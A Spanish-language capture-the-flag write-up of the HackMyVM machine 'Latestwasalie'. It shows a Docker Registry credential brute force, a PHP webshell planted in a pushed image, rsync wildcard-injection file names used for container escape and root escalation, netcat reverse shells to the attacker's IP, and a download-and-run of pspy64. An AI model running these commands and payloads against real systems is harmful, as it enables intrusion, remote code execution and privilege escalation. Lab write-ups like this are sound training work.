# Latestwasalie — WriteUp

**Plataforma:** HackMyVM  
**Autor:** Lenam  
**Dificultad:** Media-Alta  
**Fecha de resolución:** 2026-05-04  
**Sistema:** Linux (Debian)  
**IP objetivo:** 192.168.0.24  

---

## Índice

1. [Reconocimiento](#reconocimiento)
2. [Enumeración web](#enumeración-web)
3. [Docker Registry — acceso con credenciales](#docker-registry--acceso-con-credenciales)
4. [Modificación de imagen Docker — RCE](#modificación-de-imagen-docker--rce)
5. [Escape del contenedor — Wildcard Injection (rsync → backupusr)](#escape-del-contenedor--wildcard-injection-rsync--backupusr)
6. [Escalada de privilegios — Wildcard Injection (rsync root + SUID touch)](#escalada-de-privilegios--wildcard-injection-rsync-root--suid-touch)
7. [Flags](#flags)
8. [Lecciones aprendidas y errores cometidos](#lecciones-aprendidas-y-errores-cometidos)

---

## Reconocimiento

### Descubrimiento de host

```bash
sudo arp-scan -l
```

Target identificado: **192.168.0.24**

### Escaneo de puertos

```bash
sudo nmap -sV -sC -p- --min-rate 5000 -oN latestwasalie.nmap 192.168.0.24
```

**Resultado:**

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22/tcp | SSH | OpenSSH 10.0p2 Debian |
| 80/tcp | HTTP | Apache 2.4.66 |
| 5000/tcp | HTTP | **Docker Registry API 2.0** |

El puerto **5000** con Docker Registry es el vector principal — confirmado por la descripción de la máquina: *"trust boundaries between modern services"*.

---

## Enumeración web

### Puerto 80 — Default site (acceso por IP)

```bash
gobuster dir -u http://192.168.0.24 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 30 2>/dev/null
```

Encontrado: `notes.txt`

```bash
curl -s http://192.168.0.24/notes.txt
```

```
Internal deployment note
The production vhost was moved from direct IP access.
Use the correct host header or local resolution.
Expected hostname: latestwasalie.hmv
```

Añadimos el hostname a `/etc/hosts`:

```bash
echo "192.168.0.24 latestwasalie.hmv" | sudo tee -a /etc/hosts
```

### Puerto 80 — VHost latestwasalie.hmv

```bash
gobuster dir -u http://latestwasalie.hmv -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 30 2>/dev/null
```

Encontrado: `export.php` (500), `index.php` (200)

En el código fuente de `index.php`:

```html
<!-- Last deployment on April 6, 2026 by adm -->
```

**Usuario potencial: `adm`**

---

## Docker Registry — Acceso con credenciales

### Brute force al Registry

El registry en el puerto 5000 requiere autenticación básica. Con el usuario `adm` identificado en el HTML:

```bash
hydra -l adm -P /usr/share/wordlists/rockyou.txt 192.168.0.24 -s 5000 http-get /v2/ -t 64 -T 256 -w 1 -f -V 2>/dev/null | grep -E "host:|login:"
```

**Credenciales encontradas:** `adm:lover1`

### Enumeración del Registry

```bash
curl -s -u adm:lover1 http://192.168.0.24:5000/v2/_catalog | python3 -m json.tool
```

```json
{"repositories": ["latestwasalie-web"]}
```

```bash
curl -s -u adm:lover1 http://192.168.0.24:5000/v2/latestwasalie-web/tags/list | python3 -m json.tool
```

```json
{"name": "latestwasalie-web", "tags": ["latest"]}
```

---

## Modificación de imagen Docker — RCE

### Configuración del registry inseguro

```bash
echo '{"insecure-registries":["192.168.0.24:5000"]}' | sudo tee /etc/docker/daemon.json
sudo systemctl restart docker
sudo docker login 192.168.0.24:5000 -u adm -p lover1
```

### Descarga y modificación de la imagen

```bash
sudo docker pull 192.168.0.24:5000/latestwasalie-web:latest
sudo docker run -d --name lwal 192.168.0.24:5000/latestwasalie-web:latest
```

Añadimos webshell al final de `index.php` y deshabilitamos `disable_functions`:

```bash
sudo docker exec -u 0 lwal bash -c "echo '<?php if(isset(\$_REQUEST[\"cmd\"])){ echo \"<pre>\"; system(\$_REQUEST[\"cmd\"]); echo \"</pre>\"; die; }?>' >> /var/www/latestwasalie/index.php"

sudo docker exec -u 0 lwal sed -i 's/^disable_functions=.*/disable_functions=/' /usr/local/etc/php/conf.d/zz-hardening.ini
```

> **Nota:** El archivo `zz-hardening.ini` tenía `disable_functions` configurado bloqueando `system()`. Sin vaciarlo, el webshell no ejecutaría comandos.

### Commit y push al registry

```bash
sudo docker commit lwal 192.168.0.24:5000/latestwasalie-web:latest
sudo docker push 192.168.0.24:5000/latestwasalie-web:latest
```

### Verificación del RCE

El servidor tiene un cron que redespliega automáticamente la imagen del registry cada minuto. Tras ~1 minuto:

```bash
curl http://latestwasalie.hmv/?cmd=id
```

```html
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
```

**RCE confirmado como `www-data` dentro del contenedor Docker.**

> **Error cometido:** Intentamos lanzar reverse shell directamente desde el webshell (`bash -i`, `busybox nc`, `python3`). Nada funcionó porque el contenedor **no tiene salida de red directa** hacia nuestra máquina. El vector de escape es mediante el rsync del host, no una reverse shell directa.

---

## Escape del contenedor — Wildcard Injection (rsync → backupusr)

### Descubrimiento del vector

Inspeccionamos el filesystem del contenedor local para entender la estructura:

```bash
sudo docker cp lwal:/var/www/latestwasalie/ ./latestwasalie-src/
cat latestwasalie-src/export.php
```

`export.php` crea archivos en `/data/exports/` — directorio con permisos `drwxrwxrwx` (world-writable).

Desde el webshell, leemos el archivo oculto:

```bash
curl "http://latestwasalie.hmv/?cmd=cat+/data/exports/.rsync_cmd"
```

```
# Comando rsync ejecutado el lun 04 may 2026 19:58:01 CEST
rsync -e 'ssh -i /home/backupusr/.ssh/id_ed25519' -av *.txt localhost:/home/backupusr/backup/

# Usuario: backupusr
# Directorio actual: /srv/platform/appdata/exports
```

**Vector:** El host ejecuta rsync cada minuto con `*.txt` sin comillas → vulnerable a wildcard injection.

### Técnica: Wildcard Injection en rsync

Cuando bash expande `*.txt` sin comillas, un archivo llamado `-e sh shell.txt` se convierte en tres tokens: `-e`, `sh`, `shell.txt`. rsync interpreta `-e sh` como "usa `sh` como shell remoto" y ejecuta `sh shell.txt` al conectar a localhost, corriendo el contenido de `shell.txt` como script.

### Explotación

Desde el webshell, creamos los archivos en `/data/exports/`:

```bash
# Payload en shell.txt
curl "http://latestwasalie.hmv/?cmd=echo+'busybox+nc+192.168.0.42+443+-e+bash'+>+/data/exports/shell.txt"

# Archivo trampa con nombre que inyecta -e sh
curl "http://latestwasalie.hmv/?cmd=touch+%27/data/exports/-e+sh+shell.txt%27"
```

En Kali, escuchamos (con sudo — puerto < 1024):

```bash
sudo nc -lvnp 443
```

> **Error cometido:** La primera vez lanzamos `nc -lvnp 443` sin sudo. El bind falló silenciosamente y no llegó ninguna conexión. Siempre usar `sudo` para puertos < 1024.

Tras ~1 minuto, el cron de `backupusr` disparó el rsync y recibimos conexión.

### Persistencia SSH

```bash
# En Kali
ssh-keygen -t ed25519 -f /tmp/lwal -N ''
cat /tmp/lwal.pub

# En la shell de backupusr (netcat)
mkdir -p ~/.ssh && echo "ssh-ed25519 AAAA..." >> ~/.ssh/authorized_keys
```

```bash
ssh -i /tmp/lwal backupusr@192.168.0.24
```

---

## Escalada de privilegios — Wildcard Injection (rsync root + SUID touch)

### Monitorización con pspy64

```bash
# En Kali: servidor HTTP para transferir pspy64
python3 -m http.server 8080

# En SSH backupusr
curl http://192.168.0.42:8080/pspy64 -o /tmp/pspy64 && chmod +x /tmp/pspy64 && /tmp/pspy64
```

> **Error cometido:** Primera vez descargamos pspy64 pero el servidor HTTP no estaba levantado en el directorio correcto — descargó el HTML del 404. Asegurarse de lanzar `python3 -m http.server` desde el directorio donde está el binario.

### Vector identificado

```
UID=0 | rsync -e ssh -i /root/.ssh/id_ed25519 -av auth config data docker-compose.yml note.txt localhost:/root/registry-backup/
```

El script de root usa `*` en `/opt/registry/` (pspy muestra el resultado ya expandido). El directorio `/opt/registry/` contiene:

```
-rw-rw-rw- 1 root root   97 abr  4 11:44 note.txt   ← world-writable
```

Y `touch` tiene SUID:

```bash
find / -perm -4000 2>/dev/null | grep touch
# /usr/bin/touch
```

### Explotación

```bash
# En Kali: nuevo listener para root
sudo nc -lvnp 9001

# En SSH backupusr: escribir payload y crear archivo trampa
echo "busybox nc 192.168.0.42 9001 -e bash" > /opt/registry/note.txt
/usr/bin/touch /opt/registry/'-e sh note.txt'
```

Tras ~1 minuto, el cron de root disparó y recibimos shell como root.

---

## Flags

| Flag | Hash |
|------|------|
| **user.txt** | `2e0ddd70ed71cf1dcfeb747badb04adc` |
| **root.txt** | `d52d371a951a34985812cf9b96c8ffa1` |

---

## Lecciones aprendidas y errores cometidos

### Errores

| # | Error | Causa | Solución |
|---|-------|-------|----------|
| 1 | `nc -lvnp 443` sin `sudo` | Los puertos < 1024 requieren privilegios | Siempre usar `sudo` para puertos bajos |
| 2 | Intentar reverse shell desde el contenedor | El contenedor no tiene ruta de red al atacante | El escape es via rsync del host, no reverse shell directa |
| 3 | pspy64 descargó el HTML del 404 | Servidor HTTP levantado en directorio incorrecto | Verificar que el binario existe en el directorio antes de `python3 -m http.server` |
| 4 | `touch` creó archivo `-e` en lugar de `-e sh shell.txt` | El espacio en el nombre no fue codificado correctamente en la primera vez | Usar comillas simples URL-encoded `%27` alrededor del path completo |

### Conceptos clave

**Wildcard Injection en rsync:**  
Cuando un script ejecuta `rsync ... *.txt` sin comillas y el directorio es world-writable, un atacante puede crear un archivo cuyo nombre empiece por `-e sh payload.txt`. Al expandirse el glob, los espacios del nombre generan tokens separados que rsync interpreta como opciones, haciendo que ejecute `payload.txt` como script de shell remoto.

**Docker Registry como vector de intrusión:**  
Un registry Docker expuesto sin TLS y con credenciales débiles permite sobrescribir imágenes. Si existe un mecanismo de redeploy automático (cron + `docker compose up --force-recreate`), modificar la imagen supone RCE completo en el servidor.

**Trust boundaries en contenedores:**  
El contenedor tenía acceso a `/data/exports/` mediante bind mount desde el host (`/srv/platform/appdata/exports`). Aunque el contenedor no podía conectar hacia fuera, los archivos creados dentro eran procesados por procesos del host, permitiendo el escape.

---

*WriteUp elaborado con asistencia de Claude Code (CSIRT Team Leader mode)*
